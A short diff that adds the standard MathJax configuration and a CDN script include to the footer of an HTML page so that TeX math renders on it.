+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+    
+</body>
+</html>
